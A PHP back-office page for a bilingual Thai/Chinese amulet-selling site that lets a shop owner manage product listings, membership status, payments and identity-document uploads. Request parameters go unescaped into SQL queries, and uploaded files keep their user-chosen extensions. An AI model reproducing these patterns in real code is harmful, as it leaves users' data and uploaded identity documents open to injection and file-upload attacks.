<?php
	include("global.php");
	if( $_SESSION["adminshop_id"] == "" || !isset($_SESSION["adminshop_id"]) ) {  
		redi4("index.php");
	}
	
	set_page($s_page,$e_page = 20);

	if($_GET['d_product_id']){
		$rDel = mysql_fetch_array(mysql_query("DELETE FROM `product` WHERE `product_id` = ".$_GET['d_product_id']." "));
		@unlink("img/amulet/".$rDel['pic1']);
		@unlink("img/amulet/".$rDel['pic2']);		
		@unlink("img/amulet/".$rDel['pic3']);		
		@unlink("img/amulet/".$rDel['pic4']);						
		$q="DELETE FROM `product` WHERE `product_id` = ".$_GET['d_product_id']." ";
		$db->query($q);		
	}
	?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>
			ระบบจัดการเว็บไซต์  : จัดการสินค้า
		</title>
		<link rel="shortcut icon" href="favicon.ico" />
		<link rel="favicon" href="favicon.ico" />
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<!--jquery ui Local-->
		<link rel="stylesheet" href="func/jquery-ui-1.10.3/themes/base/jquery-ui.css" />
		<script src="func/jquery-ui-1.10.3/jquery-1.9.1.js"></script>
		<script src="func/jquery-ui-1.10.3/ui/jquery-ui.js"></script>
		<style type="text/css">
			html, body {
				margin:0px;
				padding:0px;
				width:100%;
				height:100%;
			}
			body {
				background-color:#000000;
			}
			body,td,th {
				font-family: Arial, Helvetica, sans-serif;
				font-size: 12px;
				color: #FFF;
			}
			a:link {
				text-decoration: none;
			}
			a:visited {
				text-decoration: none;
			}
			a:hover {
				text-decoration: none;
			}
			a:active {
				text-decoration: none;
			}
			table{
				border-collapse:collapse;
			}
			.flat_textbox {
				padding-left:0px;
				padding-right:0px;
				height:17px;
				font-family:Tahoma;
				font-size:12px;
				color:#444444;
				background-color:#ffffff;
				-webkit-box-sizing: border-box;
				-moz-box-sizing: border-box;
				box-sizing: border-box;
				border:0px solid transparent;
				outline:none;
			}
		</style>
		<script type="text/javascript">
			function MM_swapImgRestore() { //v3.0
				var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
			}
			function MM_preloadImages() { //v3.0
				var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
				var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
				if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
			}
			function MM_findObj(n, d) { //v4.01
				var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
				d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
				if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
				for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
				if(!x && d.getElementById) x=d.getElementById(n); return x;
			}
			function MM_swapImage() { //v3.0
				var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
				if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
			}
		</script>
	</head>
	<body onLoad="MM_preloadImages('images/images/menu-backend2_02.jpg','images/images/menu-backend2_04.jpg','images/images/menu-backend2_05.jpg','images/images/menu-backend2_06.jpg','images/images/menu-backend2_07.jpg','images/images/menu-backend2_08.jpg')">
		<?php
			if($_GET['hot_id']){
				$q = "update `product` set hot = '".$_GET['status']."' , hotdate =  '".time()."' WHERE `product_id` =".$_GET['hot_id']." ";
				$db->query($q);
				echo "<script>window.location.href='backend.php?s_page=".$_GET['s_page']."';</script>";			
			}
			?>
		<table width="1000px" align="center" border="0" cellpadding="0" cellspacing="0">
			<tr>
				<td>
					<img src="images/defualt.jpg" width="1000" height="271">
				</td>
			</tr>
			<tr>
				<td height="180px">
					<table width="100%" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td><img src="images/images/menubackend_01.jpg" width="103" height="180"></td>
							<td><a href="shop_index.php?shop=<?=$_SESSION['adminshop_id']?>" target="_blank" onMouseOver="MM_swapImage('Image8','','images/images/menu-backend2_02.jpg',1)" onMouseOut="MM_swapImgRestore()"><img src="images/images/menubackend_02.jpg" name="Image8" width="122" height="180" border="0"></a></td>
							<td><a href="backend.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image9','','images/images/menu-backend2_03.jpg',0)"><img src="images/images/menubackend_03.jpg" name="Image9" width="102" height="180" border="0"></a></td>
							<td><a href="banner_slide.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image10','','images/images/menu-backend2_04.jpg',1)"><img src="images/images/menubackend_04.jpg" name="Image10" width="108" height="180" border="0"></a></td>
							<td><a href="backend_banner.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image11','','images/images/menu-backend2_05.jpg',1)"><img src="images/images/menubackend_05.jpg" name="Image11" width="129" height="180" border="0"></a></td>
							<td><a href="backend_profile.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image12','','images/images/menu-backend2_06.jpg',1)"><img src="images/images/menubackend_06.jpg" name="Image12" width="103" height="180" border="0"></a></td>
							<td><a href="backend_passwod.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image13','','images/images/menu-backend2_07.jpg',1)"><img src="images/images/menubackend_07.jpg" name="Image13" width="136" height="180" border="0"></a></td>
							<td><a href="logout.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image14','','images/images/menu-backend2_08.jpg',1)"><img src="images/images/menubackend_08.jpg" name="Image14" width="92" height="180" border="0"></a></td>
							<td><img src="images/images/menubackend_09.jpg" width="105" height="180"></td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td style="height:1px;">
					<?php
						include("backend_menutop.php");
						?>
				</td>
			</tr>
			<tr>
				<td bgcolor="#c67210">
					<table width="100%" border="0" cellspacing="0" cellpadding="3">
						<tr>
							<td style="padding:10px; vertical-align:top;">
								<table width="100%" border="0" cellspacing="0" cellpadding="5">
									<tr>
										<td style="height:35px; color:#FF0; font-size:16px">
											ช่องทางการติดต่อผู้ดูแลระบบ เพื่อปรึกษาการใช้งานระบบและแจ้งปัญหา
										</td>
									</tr>
									<tr>
										<td style="height:35px; color:#FF0; font-size:16px">
											โดยสามารถติดต่อผ่านช่องทาง LINE และ We Chat โดยการสแกน QR Code หรือค้นหาไอดี
										</td>
									</tr>
									<tr>
										<td style="height:70px; vertical-align:bottom; color:#000; font-size:20px">
											QR CODE CALLCENTER
										</td>
									</tr>
								</table>
							</td>
							<td style="padding-right:10px; padding-top:10px; padding-bottom:10px; width:1px;">
								<table border="0" cellpadding="0" cellspacing="0">
									<tr>
										<td>
											<img src="file/20/images/WeChat%20Image_20180126165802.png" width="150px" height="150px">
										</td>
									</tr>
									<tr>
										<td style="padding-top:5px; text-align:center;">
											We Chat : Tee899999
										</td>
									</tr>
								</table>
							</td>
							<td style="padding-right:10px; padding-top:10px; padding-bottom:10px; width:1px;">
								<table border="0" cellpadding="0" cellspacing="0">
									<tr>
										<td>
											<img src="file/20/images/WeChat%20Image_20180126170026.jpg" width="150px" height="150px">
										</td>
									</tr>
									<tr>
										<td style="padding-top:5px; text-align:center;">
											Line ID : tee99999999
										</td>
									</tr>
								</table>
							</td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td style="background-color:#4f3b2a;">
					<table width="100%" align="center" border="0" cellpadding="0" cellspacing="0">
						<tr>
							<td colspan="10">
								<?php
									$do_what = $_POST["do_what"];
									if($do_what == "order_num"){
										$shop_id = $_POST["shop_id"];
										$product_id = $_POST["product_id"];
										$current_order_num = $_POST["current_order_num"];
										$order_num = $_POST["order_num"];
										if($order_num != 0){//echo "asd".$order_num." ".$current_order_num." ";
											if( $order_num > $current_order_num ){
												$r_order_num_max = mysql_fetch_array(mysql_query("select max(order_num) as order_num_max from product where shop_id = '$shop_id'"));
												echo $r_order_num_max["order_num_max"];
												if( $order_num > $r_order_num_max["order_num_max"] ){
													$order_num = $r_order_num_max["order_num_max"];
												}
												mysql_query("update product set order_num = ( order_num - 1 ) where shop_id = '$shop_id' and order_num >= '$current_order_num' and order_num <= '$order_num'");
												mysql_query("update product set order_num = '$order_num' where product_id = '$product_id'");
											}else if( $order_num < $current_order_num ){
												mysql_query("update product set order_num = ( order_num + 1 ) where shop_id = '$shop_id' and order_num <= '$current_order_num' and order_num >= '$order_num'");
												mysql_query("update product set order_num = '$order_num' where product_id = '$product_id'");
											}
										}
									}
									if($do_what == "order_up"){
										$shop_id = $_POST["shop_id"];
										$order_num = $_POST["order_num"];
										if($order_num != 1){
											$prev_order = mysql_fetch_array(mysql_query("select * from product where shop_id = '$shop_id' and order_num = '".($order_num-1)."'"));
											mysql_query("update product set order_num = '".($order_num-1)."' where shop_id = '$shop_id' and order_num = '$order_num'");
											mysql_query("update product set order_num = '$order_num' where shop_id = '$shop_id' and product_id = '".$prev_order["product_id"]."'");
										}
									}
									if($do_what == "order_down"){
										$shop_id = $_POST["shop_id"];
										$order_num = $_POST["order_num"];
										$order_n = mysql_num_rows(mysql_query("select * from product where shop_id = '$shop_id'"));
										if($order_num != $order_n){
											$next_order = mysql_fetch_array(mysql_query("select * from product where shop_id = '$shop_id' and order_num = '".($order_num+1)."'"));
											mysql_query("update product set order_num = '".($order_num+1)."' where shop_id = '$shop_id' and order_num = '$order_num'");
											mysql_query("update product set order_num = '$order_num' where shop_id = '$shop_id' and product_id = '".$next_order["product_id"]."'");
										}
									}
									// echo "select * from member m left join member_package p on m.package_id = p.package_id where m.id = '".$_SESSION["adminshop_id"]."'";
									// $r = mysql_fetch_array(mysql_query("select * from member m left join member_package p on m.package_id = p.package_id where m.id = '".$_SESSION["adminshop_id"]."'"));
									$r = mysql_fetch_array(mysql_query("select * from member where id = '".$_SESSION["adminshop_id"]."'"));
									$n = mysql_num_rows(mysql_query("select * from product where shop_id = '".$_SESSION["adminshop_id"]."'"));
									?>
								<table style="width:100%; font-size:16px;" border="0" cellpadding="0" cellspacing="0">
									<tr>
										<td style="padding:10px;">
											<table style="width:100%;" border="0" cellpadding="0" cellspacing="0">
												<tr>
													<td height="25" colspan="2">
														แพคเกจ / 商店
														:
														<?
															$rs = mysql_fetch_array(mysql_query("select * from member_payment m inner join member_package mp on m.payment_packege = mp.package_id  where mem_id = '".$r["id"]."' order by pay_id desc limit 1 "));
															echo $rs["package_name"];
														?>
													</td>
												</tr>
												<tr>
													<td width="410" height="25">
														วันที่เปิดร้าน / 开店日期
														:
														<?
															echo date("d F Y",strtotime($r['shop_date']));
														?>
													</td>
													<td width="570" height="25" style="padding-left:20px;">
														ต่ออายุล่าสุด / 最后次会员续期申请日期
														:
														<?
															if($r["date_extend"] == ""){
																echo 0;
															}else{
																echo date("d F Y", $r["date_extend"]);
															}
														?>
													</td>
												</tr>
												<tr>
													<td height="25">
														สิ้นสุดวันที่ / 结束日期
														:
														<?
															if($r["date_expire"] == ""){
																echo 0;
															}else{
																echo date("d F Y",$r["date_expire"]);
															}
														?>
													</td>
													<td height="25" style="padding-left:20px;">
														เหลืออีก / 剩下
														:
														<?
															$datanow = strtotime(date("Y-m-d"));
															$result = ($r["date_expire"]-$datanow)/86400;
															if($result>0){
																echo $result;
															}else{
																echo 0;
															}
														?>
														วัน / 天
													</td>
												</tr>
												<tr>
													<td height="25" colspan="2">
														จำนวนสินค้าที่ลง / 总共商品
														:
														<span style="color:rgb(209, 97, 97);font-weight:bold;"><?=$n .' / '.$r['pack_amountformem'];?></span>
														尊
													</td>
												</tr>
												<?php
													$db->query("select * from `member` where id = '".$_SESSION['adminshop_id']."'");
													$db->next_record();
													$shop_id = $db->f(id);
													if( $db->f(file1) == '' || $db->f(file2) == '' || $db->f(file_check) == "0" ){
													?>
												<tr>
													<td colspan="2">
														<?php
															$filepart1 = $_FILES["file1"]["tmp_name"];
															$filename1 = $_FILES["file1"]["name"];
															if($filepart1 != ""){
																$fileextension1 = end(explode(".",$filename1));
																$filename1 = time()."1.".$fileextension1;
																copy($filepart1,"member_file/".$filename1);
																$q = "update `member` set file1 = '$filename1', file_check = '2' WHERE `id` = '".$_SESSION['adminshop_id']."' ";
																$db->query($q);
																redi2();
															}
															$filepart2 = $_FILES["file2"]["tmp_name"];
															$filename2 = $_FILES["file2"]["name"];
															if($filepart2 != ""){
																$fileextension2 = end(explode(".",$filename2));
																$filename2 = time()."2.".$fileextension2;
																copy($filepart2,"member_file/".$filename2);
																$q = "update `member` set file2 = '$filename2', file_check = '2' WHERE `id` = '".$_SESSION['adminshop_id']."' ";
																$db->query($q);
																redi2();
															}
															?>
														<form method="post" enctype="multipart/form-data">
															<table width="100%" cellpadding="0" cellspacing="0">
																<tr>
																	<td>
																		<span style="color:#FC0">
																		ท่านยังไม่ได้ส่งเอกสารแจ้งยืนยันตัวตัน ส่งเอกสาร
																		/
																		您没有把您的复制资料传上
																		</span>
																	</td>
																</tr>
																<tr>
																	<td>
																		<table border="0" cellpadding="0" cellspacing="0">
																			<tr>
																				<td style="color:#FC0">
																					สำเนาหน้า book bank
																					/
																					传上复制的首页银行帐薄
																					: 
																					<input name="file1" type="file" id="file1">
																				</td>
																				<td>
																					<div style="position:relative;" onmouseover="$(this).find('div').show();" onmouseout="$(this).find('div').hide();">
																						<div style="display:none; position:absolute; right:-320px; bottom:-20px; -webkit-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; -moz-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; box-shadow: rgba(0,0,0,0.5) 0px 0px 7px;">
																							<img src="member_file/<?=$db->f(file1)?>" width="300px" border="0"/>
																						</div>
																						<a href="member_file/<?=$db->f(file1)?>" target="_blank">
																						<img src="member_file/<?=$db->f(file1)?>" height="30px" border="0"/>
																						</a>
																					</div>
																				</td>
																			</tr>
																		</table>
																	</td>
																</tr>
																<tr>
																	<td height="25" colspan="2">
																		<table border="0" cellpadding="0" cellspacing="0">
																			<tr>
																				<td style="color:#FC0">
																					สำเนาบัตรประชาชน
																					/
																					传上复制的身份证卡
																					: 
																					<input name="file2" type="file" id="file2">
																				</td>
																				<td>
																					<div style="position:relative;" onmouseover="$(this).find('div').show();" onmouseout="$(this).find('div').hide();">
																						<div style="display:none; position:absolute; right:-320px; bottom:-20px; -webkit-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; -moz-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; box-shadow: rgba(0,0,0,0.5) 0px 0px 7px;">
																							<img src="member_file/<?=$db->f(file2)?>" width="300px" border="0"/>
																						</div>
																						<a href="member_file/<?=$db->f(file2)?>" target="_blank">
																						<img src="member_file/<?=$db->f(file2)?>" height="30px" border="0"/>
																						</a>
																					</div>
																				</td>
																			</tr>
																		</table>
																	</td>
																</tr>
																<tr>
																	<td height="25" colspan="2">
																		<input type="submit" value="ยืนยันการอัพโหลด / 确定"/>
																	</td>
																</tr>
															</table>
														</form>
													</td>
												</tr>
												<?php
													}else if( $db->f(file_check) == "2" ){
													?>
												<tr>
													<td style="padding-top:10px; vertical-align:bottom;">
														<form method="post" enctype="multipart/form-data">
															<table style="background-color:#3d2000; border:3px solid #78440b;" border="0" cellpadding="0" cellspacing="0">
																<tr>
																	<td colspan="3" style="padding-left:15px; height:35px; color:#ffcc00; background-color:#692908;">
																		เอกสารรอการตรวจสอบ
																		/
																	</td>
																</tr>
																<tr>
																	<td style="padding-left:15px; height:40px; text-align:right; color:#ffcc00; white-space:nowrap;">
																		สำเนาหน้า book bank
																		/
																		传上复制的首页银行帐薄
																	</td>
																	<td style="padding-left:10px; padding-right:10px; width:1px; color:#ffcc00;">
																		:
																	</td>
																	<td style="padding-right:15px;">
																		<div style="position:relative;" onmouseover="$(this).find('div').show();" onmouseout="$(this).find('div').hide();">
																			<div style="display:none; position:absolute; right:-320px; bottom:-20px; -webkit-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; -moz-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; box-shadow: rgba(0,0,0,0.5) 0px 0px 7px;">
																				<img src="member_file/<?=$db->f(file1)?>" width="300px" border="0"/>
																			</div>
																			<a href="member_file/<?=$db->f(file1)?>" target="_blank">
																			<img src="member_file/<?=$db->f(file1)?>" height="30px" border="0"/>
																			</a>
																		</div>
																	</td>
																</tr>
																<tr>
																	<td style="padding-left:15px; height:40px; text-align:right; color:#ffcc00; white-space:nowrap;">
																		สำเนาบัตรประชาชน
																		/
																		传上复制的身份证卡
																	<td style="padding-left:10px; padding-right:10px; width:1px; color:#ffcc00;">
																		:
																	</td>
																	<td style="padding-right:15px;">
																		<div style="position:relative;" onmouseover="$(this).find('div').show();" onmouseout="$(this).find('div').hide();">
																			<div style="display:none; position:absolute; right:-320px; bottom:-20px; -webkit-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; -moz-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px; box-shadow: rgba(0,0,0,0.5) 0px 0px 7px;">
																				<img src="member_file/<?=$db->f(file2)?>" width="300px" border="0"/>
																			</div>
																			<a href="member_file/<?=$db->f(file2)?>" target="_blank">
																			<img src="member_file/<?=$db->f(file2)?>" height="30px" border="0"/>
																			</a>
																		</div>
																	</td>
																</tr>
															</table>
														</form>
													</td>
													<td valign="top" style="padding-top:10px">
														<a href="http://www.youtube.com/watch?v=XmICm38hfQA">
															<table width="158" height="120" border="0" align="left" cellpadding="0" cellspacing="0">
																<tr>
																	<td height="90" align="center" bgcolor="#FFF"><span style="color:#000; font-weight:bold"><img src="images/YouTube-plate.png" width="100" height="46"><br>
																		แนะนำการลงสินค้า <br>
																		如何增加产品</span><br />
																		<span style="color:#F00; font-weight:bold; font-size:14px">www.praasia.com
																		</span>
																	</td>
																</tr>
															</table>
														</a>
													</td>
												</tr>
												<?php
													}
													?>
												<tr>
													<td colspan="2">
														<div style="color:#FFF; overflow-y:auto; overflow-x:hidden; height:270px; width:980px;; background-color:#FFF">
															<table width="980" border="0" align="center" cellpadding="5" cellspacing="0">
																<?php 
																	$q="SELECT * FROM `newshop` WHERE 1 ";
																	$dbnews= new nDB();
																	$dbnews->query($q);
																	$dbnews->next_record();
																	?>
																<tr>
																	<td>
																		<span style="color:#FC0"><?=$dbnews->f(detail)?></span>
																	</td>
																</tr>
															</table>
														</div>
													</td>
												</tr>
											</table>
										</td>
									</tr>
                                    <tr>
                                    	<td height="50" align="center" bgcolor="#FFCC00" style="font-size:18px">
                                        <a href="check_certificate_doc.php?username=<?=$db->f(username)?>" target="_blank"><span style="color:#930; font-size:18px">ตรวจสอบการออกบัตรรับรองของคุณ / 检查自己的鉴定项目资料</span></a>
                                        </td>
                                  </tr>
									<tr>
										<td style="padding:5px; background-color:#311407;">
											<style type="text/css">
												.btn_product{
													padding-left:5px; 
													padding-right:5px; 
													height:25px; 
													font-size:12px; 
													color:#006600; 
													cursor:pointer;"
												}
												.btn_addproduct{
													padding-left: 10px;
													padding-right: 10px;
													height: 25px;
													font-size: 12px;
													color: #006600;
													cursor: pointer;
													font-weight: bold;
												}
											</style>
											<table width="100%" cellpadding="0" cellspacing="0">
												<tr>
													<td>&nbsp;</td>
												</tr>
												<tr align="center">
													<td width="68%">
														<input  type="button" id="agree" class="btn_product" name="agree" value="เพิ่มประวัติเกจิ/编辑高僧介绍区" onClick="window.location='backend_geji.php'"/>
														<input  type="button" id="agree" class="btn_product" name="agree" value="เพิ่มประสบการณ์พระเครื่อง / 增加聖物的经历分类" onClick="window.location='backend_exp.php'"/>
														<?
															$datanow = strtotime(date("Y-m-d"));
															$result = ($r["date_expire"]-$datanow)/86400;

															if(($r["date_expire"] == "") || ($result > 0)){
																$disabled_input_renew = 'disabled style="opacity: 0.5;color: #000;cursor: auto;"';
															}
														?>
														

														<input  type="button" id="agree" <?=$disabled_input_renew;?> class="btn_product" name="agree" value="ต่ออายุสมาชิกร้านค้า 续期申请商店" onClick="window.location='renew_age.php'"/>
														<?
															$c_payment = mysql_num_rows(mysql_query("select * from member_payment where mem_id = '".$_SESSION["adminshop_id"]."' and payment_manage = '2' "));
															$disabled_input_payment = "";
															if( $c_payment > 0){
																$disabled_input_payment = 'disabled style="opacity: 0.5;color: #000;cursor: auto;"';
															}
														?>
														

														<input  type="button" id="agree" <?=$disabled_input_payment;?> class="btn_product" name="agree" value="แจ้งชำระเงินสำหลับร้านค้าเปิดใหม่ 通知付款(新商店)" onClick="window.location='check_package.php'"/>
													</td>
												</tr>
												<tr>
													<td>&nbsp;</td>
												</tr>
												<tr align="center">
													<td width="32%">
														<?php
															$rspay = mysql_fetch_array(mysql_query("select * from member_payment where mem_id = '".$_SESSION["adminshop_id"]."' order by pay_id desc limit 1"));
															$rspaystatus = $rspay['payment_manage'];

															if($r["date_expire"] == ""){ //new create shop
																if($rspaystatus == 1){
																	?>
																	<span style="color:rgb(209, 191, 97);font-weight:bold;font-size:14px;">ท่านได้ทำการแจ้งชำรแล้ว ระบบกำลังทำการตรวจสอบ... / 等待网站团队中心再次审批...</span>
																	<?
																}else{
																	?>
																	<span style="color:rgb(209, 97, 97);font-weight:bold;font-size:14px;">กรุณาชำระเงินก่อนลงสินค้า / 请付款先才能增加产品</span>
																	<?
																}
															}else{ // old shop
																$datanow = strtotime(date("Y-m-d"));
																$result = ($r["date_expire"]-$datanow)/86400;
																if($result< 0){
																?>
																<span style="color:rgb(209, 97, 97);font-weight:bold;font-size:14px;">หมดอายุการใช้งาน กรุณาต่ออายุการใช้งาน / 商店到期 请续期申请后才能使用</span>
																<?
																}else{
																	
																	if($rspaystatus == 2){
																		if(($n >= $r["pack_amountformem"])){
																			?>
																				สินค้าได้เต็มแพ็กเกจที่ท่านเลือกเรียบร้อยแล้ว / 产品上传已满Select Package(产品支付数量)
																			<?
																		}else{
																			?>
																				<input class="btn_addproduct" type="button" id="agree" name="agree" value="เพิ่มสินค้า / 新增产品" onclick="checkbeforadd('<?=$_SESSION['adminshop_id']?>');"/>
																				&nbsp;
																				<input class="btn_addproduct" type="button" value="วิธีใช้เว็บและเพิ่มสินค้า / 使用网站与增加产品指南" onclick="window.open('http://praasia.com/help.php');"/>
                                                                                &nbsp;
                                                                                <input class="btn_addproduct" type="button" value="เพิ่มรายสายตรงจากคณะกรรมการ/增加我专业佛牌鉴定项目" onclick="window.open('http://www.praasia.com/content_referee.php?id=<?=$_SESSION['adminshop_id']?>');"/>
                                                                                &nbsp;
                                                                                <input class="btn_addproduct" type="button" value="ดาวน์โหลดแบบฟอร์มออกบัตร/ 鉴定表格下载" onclick="window.open('http://www.praasia.com/certificate_document_praasia.pdf');"/>
                                                                                <input class="btn_addproduct" type="button" value="ตรวจสอบการออกบัตรรับรองของคุณ/ 检查自己的鉴定项目资料" onclick="window.open('http://www.praasia.com/check_certificate_doc.php?username=<?=$db->f(username)?>');"/>
																			<?
																		}
																	}else if($rspaystatus == 1){
																		?>
																		<span style="color:rgb(209, 191, 97);font-weight:bold;font-size:14px;">ระบบได้รับแจ้งข้อมูลแล้วครับ รออีกไม่นาน ทีมงานจะรีบดำเนินการอนุมัติให้แล้วเสร็จครับ 该系统已被通知，等待团队审批 。</span>
																		<?
																	}else if($rspaystatus == 0){
																		?>
																		<span style="color:rgb(209, 191, 97);font-weight:bold;font-size:14px;">ท่านยังลงสินค้าไม่ได้ กรุณาทำการชำระเงินก่อน / 您还不能上传产品，必需先付款 <a href="member_payment.php?order=<?=$rspay['no_regist'];?>" target="_blank">ใบแจ้งชำระเงิน</a></span>
																		<?
																	}
																}
															}
														?>                                    
													</td>
												</tr>
												<tr>
													<td>&nbsp;</td>
												</tr>
											</table>
										</td>
									</tr>
								</table>
							</td>
						</tr>
						<style type="text/css">
							.notificat_del{
								background: #E4E438;
							  width: 21px;
							  height: 21px;
							  display: table-cell;
							  text-align: center;
							  vertical-align: middle;
							  border-radius: 4px;
							  box-shadow: 1px 2px 3px #311407;
							  position: relative;
							  cursor: pointer;
							}
							.notificat_del_active{
								width: 21px;
							  height: 21px;
							  position: absolute;
							  background: url(images/notificat_check.png) top center no-repeat;
							  top: 0;
  							left: 0;
  							display: none;
							}
						</style>
						<script type="text/javascript">
							function notificat_del(x_obj,x_id){
								// if(x_obj.find(".notificat_del_active").is(':hidden'))
								// {
								// 	x_obj.find(".notificat_del_active").show();
								// 	x_do_what = "delete";
								// }
								// else
								// {
								// 	x_obj.find(".notificat_del_active").hide();
								// 	x_do_what = "no_delete";
								// }
								if(x_obj.is(":checked")){
									x_do_what = "delete";
								}else{
									x_do_what = "no_delete";
								}

								$.ajax({
									url: "backend_notif_delete.php",
									type: "POST",
									dataType: "JSON",
									data: {do_what:x_do_what,id:x_id},
									cache: false,
									processData: true,
									success: function (result) {
										// console.log(result)
									}
								});
							}
						</script>
						<tr>
							<td width="32" height="25" align="center" bgcolor="#692908">No.</td>
							<td width="32" align="center" bgcolor="#692908">ลำดับ</td>
							<td width="95" align="center" bgcolor="#692908">รูปภาพ / 图片</td>
							<td width="210" align="center" bgcolor="#692908">ชื่อ / 产品名</td>
							<td width="90" align="center" bgcolor="#692908">ราคา / 价格</td>
							<td width="102" align="center" bgcolor="#692908">สถานะ / 状况</td>
							<td width="83" align="center" bgcolor="#692908">ผู้เยี่ยมชม / 游客</td>
							<td width="139" align="center" bgcolor="#692908">สินค้าแนะนำ / 热门产品</td>
							<td width="65" align="center" bgcolor="#692908">แก้ไข / 编辑</td>
							<td width="61" align="center" bgcolor="#692908">ลบ / 該</td>
						</tr>
						<?php
							$q="SELECT * FROM `member` WHERE id='".$_SESSION['adminshop_id']."' ";
							$db->query($q);
							$db->next_record();
							$shop_id = $db->f(id);	

							$q="SELECT * FROM `product` WHERE shop_id='$shop_id'";
							$db->query($q);							
							$total=$db->num_rows();							
							$q.=" ORDER BY order_num desc LIMIT $s_page,$e_page ";
							$db->query($q);
							static $v=1; 
							while($db->next_record()){
							?>		
						<tr bgcolor="<?=($v%2==1)?"#311407":"#4f3b2a"?>">
							<td height="25" align="center">
								<?=$db->f(product_id)?>
							</td>
							<td align="center" style="border-left:1px dashed #975000;">
								<table align="center" border="0" cellpadding="0" cellspacing="0">
									<tr>
										<td style="text-align:center;">
											<form method="post">
												<input name="do_what" value="order_down" type="hidden"/>
												<input name="shop_id" value="<?=$shop_id?>" type="hidden"/>
												<input name="order_num" value="<?=$db->f(order_num)?>" type="hidden"/>
												<img onClick="$(this).parent().submit();" style="cursor:pointer;" src="images/arrow_up.png" border="0"/>
											</form>
										</td>
									</tr>
									<tr>
										<td style="text-align:center;">
											<form method="post">
												<input name="do_what" value="order_num" type="hidden"/>
												<input name="shop_id" value="<?=$shop_id?>" type="hidden"/>
												<input name="product_id" value="<?=$db->f(product_id)?>" type="hidden"/>
												<input name="current_order_num" value="<?=$db->f(order_num)?>" type="hidden"/>
												<input class="flat_textbox" name="order_num" onchange="$(this).parent().submit();" value="<?=$db->f(order_num)?>" style="width:25px; text-align:center;" type="text"/>
											</form>
										</td>
									</tr>
									<tr>
										<td style="text-align:center;">
											<form method="post">
												<input name="do_what" value="order_up" type="hidden"/>
												<input name="shop_id" value="<?=$shop_id?>" type="hidden"/>
												<input name="order_num" value="<?=$db->f(order_num)?>" type="hidden"/>
												<img onClick="$(this).parent().submit();" style="cursor:pointer;" src="images/arrow_down.png" border="0"/>
											</form>
										</td>
									</tr>
								</table>
							</td>
							<td align="center">
								<a href="http://www.praasia.com/shop_product.php?product_id=<?=$db->f(product_id)?>" target="_blank">
								<img src="/resize/w90-h90/img/amulet/<?=$db->f(pic1)?>" width="90" height="90" />
								</a>
							</td>
							<td align="left"><?=$db->f(name)?></td>
							<td align="center"><?=$db->f(price)?></td>
							<td align="center">
								<? if ($db->f(status)==1) { ?>
								<span style="color:#09F">พระโชว์ / 展示</span>
								<? } ?>
								<? if ($db->f(status)==2) { ?>
								<span style="color:#090">ให้เช่า / 出售</span>
								<? } ?>
								<? if ($db->f(status)==3) { ?>
								<span style="color:#FF0">เปิดจอง / 预定</span>
								<? } ?>
								<? if ($db->f(status)==4) { ?>
								<span style="color:#FC0">จองแล้ว / 已定</span>
								<? } ?>
								<? if ($db->f(status)==5) { ?>
								<span style="color:#F00">ขายแล้ว / 已出售</span>
								<? } ?>                                     
							</td>
							<td align="center"><?=$db->f(view_num)?></td>
							<td align="center">
								<? if($db->f(hot)=='0'){?>
								<a href="?hot_id=<?=$db->f(product_id)?>&status=1&s_page=<?=$_GET["s_page"]?>" ><img src="images/wait.png" alt="No Hot" width="22" height="24" border="0"></a>
								<? }else{?>
								<a href="?hot_id=<?=$db->f(product_id)?>&status=0&s_page=<?=$_GET["s_page"]?>" >
								<img src="images/ok.png" alt="Hot" width="22" height="24" border="0"></a>
								<? }?>
							</td>
							<td align="center">
								<a href="backend_add.php?e_product_id=<?=$db->f(product_id)?>&s_page=<?=$_GET['s_page']?>" ><img src="images/edit.gif" width="22" height="24" border="0"></a>
							</td>
							<td align="center">
								<?php 
								if($total <= 200){
									?>
								<input type="checkbox" onclick="notificat_del($(this),<?=$db->f(product_id)?>)" <?php echo ($db->f(notification_del) == 1)?'checked':'';?>>
								<!-- <div class="notificat_del" onclick="notificat_del($(this),<?=$db->f(product_id)?>)">
									<div class="notificat_del_active" style="display:<?php echo ($db->f(notification_del) == 1)?'block':'none';?>"></div>
								</div> -->
									<?php
								}else{
									?>
								<a href="backend.php?d_product_id=<?=$db->f(product_id);?>" onclick="return confirm('กรุณายืนยันการลบอีกครั้ง !!!')" ><img src="images/del.gif" width="22" height="24" border="0"></a>
